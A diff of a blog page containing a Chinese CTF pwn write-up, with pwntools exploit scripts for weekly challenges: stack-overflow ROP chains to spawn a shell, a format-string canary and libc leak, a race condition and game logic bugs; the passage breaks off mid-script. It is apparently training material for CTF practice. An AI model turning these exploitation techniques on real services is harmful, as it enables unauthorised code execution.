@@ -211,14 +211,14 @@
                 
                 <span class="tag">
                     
-                    <a href="/tags/Pwn/" style="color: #03a9f4">
+                    <a href="/tags/Pwn/" style="color: #ffa2c4">
                         Pwn
                     </a>
                 </span>
                 
                 <span class="tag">
                     
-                    <a href="/tags/WriteUp/" style="color: #ffa2c4">
+                    <a href="/tags/WriteUp/" style="color: #00a596">
                         WriteUp
                     </a>
                 </span>
@@ -228,16 +228,18 @@
         </div>
     
     <div class="content" v-pre>
-        <p>因为都比较简单，所以基本都是直接摆 exp.py，文本量会比较少。</p>
+        <p>因为都比较简单，所以基本都是直接摆 <a target="_blank" rel="noopener" href="http://exp.py">exp.py</a>，文本量会比较少。</p>
 <p>week3 研究强网杯去了所以打的晚了点（</p>
 <p>有的题出的不错，有的题根本不想做。我选 pwn 方向本来就是因为不想猜谜……</p>
 <p>不过还是比较有收获的</p>
-<h2 id="Week1"><a href="#Week1" class="headerlink" title="[Week1]"></a>[Week1]</h2><h3 id="幸运星"><a href="#幸运星" class="headerlink" title="幸运星"></a>幸运星</h3><pre><code class="python">#!/usr/bin/env python3
+<h2 id="Week1">[Week1]</h2>
+<h3 id="幸运星">幸运星</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-04 11:10:35
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;110509_pwn_patched&quot;
@@ -249,16 +251,16 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b time
 c
 nextret
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/libc6-dbg_2.35-0ubuntu3_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/glibc-source_2.35-0ubuntu3_all/usr/src/glibc/glibc-2.35
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 # 0x68e0905b
 def start():
     if args.GDB:
@@ -272,12 +274,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -287,10 +289,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -316,7 +318,7 @@ cnt = 0
 seed = time_fn(0)
 seq = glibc_rand_seq(seed)
 io.success(str(len(seq)))
-io.recvuntil(b&quot;Pay attention to that guy called libc, I think you&#39;ll like it\n&quot;)
+io.recvuntil(b&quot;Pay attention to that guy called libc, I think you'll like it\n&quot;)
 for val in seq:
     io.sendlineafter(b&quot;Please enter a number (0-60):&quot;, itob(val))
     cnt+=1
@@ -326,14 +328,16 @@ for val in seq:
     if (cnt == 50 ): 
         io.interactive()
         break
-</code></pre>
-<h3 id="no-vuln"><a href="#no-vuln" class="headerlink" title="no vuln"></a>no vuln</h3><p>简单条件竞争，部分代码 ai 写的所以可能有点难用（</p>
-<pre><code class="python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+</code></pre>
+<h3 id="no-vuln">no vuln</h3>
+<p>简单条件竞争，部分代码 ai 写的所以可能有点难用（</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+
+'''
     author: Yoisaki_Kanade
     time: 2025-10-04 10:41:20
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;102218_NoVuln_patched&quot;
@@ -345,14 +349,14 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/libc6-dbg_2.35-0ubuntu3_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/glibc-source_2.35-0ubuntu3_all/usr/src/glibc/glibc-2.35
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -406,14 +410,16 @@ if __name__ == &quot;__main__&quot;:
     for t in writers:
         t.join(timeout=0.2)
 </code></pre>
-<h3 id="危险的-gets"><a href="#危险的-gets" class="headerlink" title="危险的 gets"></a>危险的 gets</h3><p>裸的栈溢出，因为简单的栈溢出太多了所以找不到exp了（</p>
-<h3 id="count"><a href="#count" class="headerlink" title="count"></a>count</h3><p>python有个好用的函数叫做eval.</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="危险的-gets">危险的 gets</h3>
+<p>裸的栈溢出，因为简单的栈溢出太多了所以找不到exp了（</p>
+<h3 id="count">count</h3>
+<p>python有个好用的函数叫做eval.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-09-20 13:59:48
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 # filename = &quot;pwn_patched&quot;
@@ -425,16 +431,16 @@ proc_name = &quot;&quot;
 # elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -448,12 +454,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -463,10 +469,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -481,24 +487,26 @@ rl = lambda x : p.recvline()[:x]
 s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
-sl(b&#39;4100625&#39;)
+sl(b'4100625')
 ru(&quot;Are you ready?\n&quot;)
 for i in range(20):
     s = r(16).decode()
-    if(s[-1] == &#39;=&#39;):
+    if(s[-1] == '='):
         s = s[:-1]
     print(s)
     sl(itob(hex(eval(s))))
     ru(b&quot;correct!\n&quot;)
 ia()
 </code></pre>
-<h2 id="Week2"><a href="#Week2" class="headerlink" title="[Week2]"></a>[Week2]</h2><h3 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h3><p>有野生binsh字符串</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h2 id="Week2">[Week2]</h2>
+<h3 id="stackoverflow">stackoverflow</h3>
+<p>有野生binsh字符串</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-11 10:29:12
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;100813_pwwn_patched&quot;
@@ -510,14 +518,14 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/libc6-dbg_2.35-0ubuntu3_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/glibc-source_2.35-0ubuntu3_all/usr/src/glibc/glibc-2.35
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -531,12 +539,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -546,10 +554,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -568,21 +576,22 @@ itob = lambda x : str(x).encode()
 pop_rdi_ret = 0x0000000000401332
 bin_sh = 0x4035C8
 back = 0x40132D 
-pay = b&#39;A&#39;*(0x13+0x8) + p64(pop_rdi_ret) + p64(bin_sh) + p64(back)
+pay = b'A'*(0x13+0x8) + p64(pop_rdi_ret) + p64(bin_sh) + p64(back)
 ru(&quot;2. The power of water\n&quot;)
-sl(b&#39;1&#39;)
-sla(&quot;[Yes/No]&gt;&gt;&quot;,b&#39;No&#39;)
+sl(b'1')
+sla(&quot;[Yes/No]&gt;&gt;&quot;,b'No')
 ru(&quot;pls show the GOD your power &gt;&gt;&quot;)
 sl(pay)
 ia()
 </code></pre>
-<h3 id="where-are-my-addr"><a href="#where-are-my-addr" class="headerlink" title="where are my addr"></a>where are my addr</h3><p>开了 pie 但给了 main 基址</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="where-are-my-addr">where are my addr</h3>
+<p>开了 pie 但给了 main 基址</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-11 10:14:13
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;101302_pwn_patched&quot;
@@ -594,14 +603,14 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/libc6-dbg_2.35-0ubuntu3_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/glibc-source_2.35-0ubuntu3_all/usr/src/glibc/glibc-2.35
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -615,12 +624,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -630,10 +639,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -649,21 +658,24 @@ sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
 # Your exploit here
 ru(&quot;this is a gift for you :main_addr: &quot;)
-# main_addr = u64(rl(-1).ljust(0x8,b&#39;\0&#39;))
+# main_addr = u64(rl(-1).ljust(0x8,b'\0'))
 main_addr = int(r(-1)[:14],16)
 print(main_addr)
-pay = b&#39;a&#39;*0x48 + p64(main_addr+ 0x11c9-0x126c+0x8)
+pay = b'a'*0x48 + p64(main_addr+ 0x11c9-0x126c+0x8)
 sl(pay)
 ia()
 </code></pre>
-<h3 id="bird"><a href="#bird" class="headerlink" title="bird"></a>bird</h3><p>假 canary，当一般栈溢出打就行（</p>
-<h2 id="Week3"><a href="#Week3" class="headerlink" title="[Week3]"></a>[Week3]</h2><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>简单格式化字符串</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="bird">bird</h3>
+<p>假 canary，当一般栈溢出打就行（</p>
+<h2 id="Week3">[Week3]</h2>
+<h3 id="fmt">fmt</h3>
+<p>简单格式化字符串</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-20 20:29:27
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;pwn_patched&quot;
@@ -675,17 +687,17 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 # b printf
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -699,12 +711,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -714,10 +726,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -731,17 +743,17 @@ rl = lambda x : p.recvline()[:x]
 s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 
 def change(s):
-    sla(&quot;Enter your choice: &quot;,b&#39;2&#39;)
+    sla(&quot;Enter your choice: &quot;,b'2')
     sla(&quot;Enter new name: &quot;,s)
 
 def greet():
-    sla(&quot;Enter your choice: &quot;,b&#39;1&#39;)
+    sla(&quot;Enter your choice: &quot;,b'1')
 
 def bye():
-    sla(&quot;Enter your choice: &quot;,b&#39;3&#39;)
+    sla(&quot;Enter your choice: &quot;,b'3')
 
 # Your exploit here
 pay = b&quot;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;
@@ -752,24 +764,24 @@ sla(&quot;Enter your name: &quot;,pay)
 greet()
 ru(&quot;hello, &quot;)
 stack_addr = int(r(14),16)
-ru(&#39;-&#39;)
+ru('-')
 libc_addr = int(r(14),16) - 0x21c87
-ru(&#39;-&#39;)
+ru('-')
 canary = int(r(18),16)
-ru(&#39;-&#39;)
+ru('-')
 main_addr = int(r(14),16)
 flag_addr = main_addr - 0x12f7 + 0x4010
 
-change(b&#39;%4660c%14$hn&#39;.ljust(0x10,b&#39;\0&#39;) + p64(flag_addr))
+change(b'%4660c%14$hn'.ljust(0x10,b'\0') + p64(flag_addr))
 greet()
 bin_sh = libc_addr + 0x1b3d88
 pop_rdi_ret = libc_addr + 0x2164f
 system = libc_addr + 0x4f420
 ret = libc_addr + 0xb1485
 pay = flat([
-    b&#39;a&#39;*0x68,
+    b'a'*0x68,
     canary,
-    b&#39;b&#39;*0x8,
+    b'b'*0x8,
     pop_rdi_ret,
     bin_sh,
     ret,
@@ -785,13 +797,14 @@ p.success(hex(canary))
 p.success(hex(main_addr))
 ia()
 </code></pre>
-<h3 id="key-的大冒险-1"><a href="#key-的大冒险-1" class="headerlink" title="key 的大冒险(1)"></a>key 的大冒险(1)</h3><p>可以无限 equip 物品</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="key-的大冒险-1">key 的大冒险(1)</h3>
+<p>可以无限 equip 物品</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-20 19:45:21
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;190435_adventure1_patched&quot;
@@ -803,16 +816,16 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/libc6-dbg_2.35-0ubuntu3_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/glibc-source_2.35-0ubuntu3_all/usr/src/glibc/glibc-2.35
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -826,12 +839,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -841,10 +854,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -858,28 +871,29 @@ rl = lambda x : p.recvline()[:x]
 s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 # Your exploit here
 
 def buy(i):
-    sla(&quot;Choose an option:&quot;,b&#39;6&#39;)
+    sla(&quot;Choose an option:&quot;,b'6')
     sla(&quot;Enter the number of the item you want to equip (1-3):&quot;,itob(i))
-    sla(&quot;You want to say something to the village chief: &quot;,b&#39;\n&#39;)
+    sla(&quot;You want to say something to the village chief: &quot;,b'\n')
 
 for i in range(100):
     buy(1)
     buy(2)
     buy(3)
-sla(&quot;Choose an option:&quot;,b&#39;1&#39;)
+sla(&quot;Choose an option:&quot;,b'1')
 ia()
 </code></pre>
-<h3 id="sokoban"><a href="#sokoban" class="headerlink" title="sokoban"></a>sokoban</h3><p>审计二进制文件，发现右下角的目标位置可以无限刷分。</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="sokoban">sokoban</h3>
+<p>审计二进制文件，发现右下角的目标位置可以无限刷分。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-21 16:54:47
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;165144_pwwn&quot;
@@ -891,17 +905,17 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 b *0x402723
 set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/libc6-dbg_2.35-0ubuntu3_amd64/usr/lib/debug
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.35-0ubuntu3/amd64/glibc-source_2.35-0ubuntu3_all/usr/src/glibc/glibc-2.35
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -915,12 +929,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -930,10 +944,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
